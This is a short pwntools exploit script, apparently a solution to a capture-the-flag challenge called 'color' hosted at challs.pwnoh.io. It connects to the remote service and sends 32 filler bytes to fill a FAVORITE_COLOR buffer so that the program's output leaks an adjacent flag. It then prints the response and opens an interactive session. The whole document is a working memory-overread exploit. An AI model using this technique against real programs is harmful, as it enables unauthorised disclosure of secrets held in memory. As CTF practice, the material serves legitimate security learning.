from pwn import *

# Start the process
# p = process('./color')  # Replace with your binary
p  = remote('challs.pwnoh.io', 13370)

# Prepare the payload
# Buffer size is 32 (0x20) for FAVORITE_COLOR, overflow happens after 32 bytes
payload = b"A" * 32  # Fill FAVORITE_COLOR completely

# Send the payload to the program
p.sendline(payload)

# Receive the response
p.recvuntil("What's your favorite color? ")

# Since the program will print the contents of FAVORITE_COLOR, this should leak FLAG
response = p.recv()

# Print the leaked flag
print(response)

# Keep the process open for interaction
p.interactive()
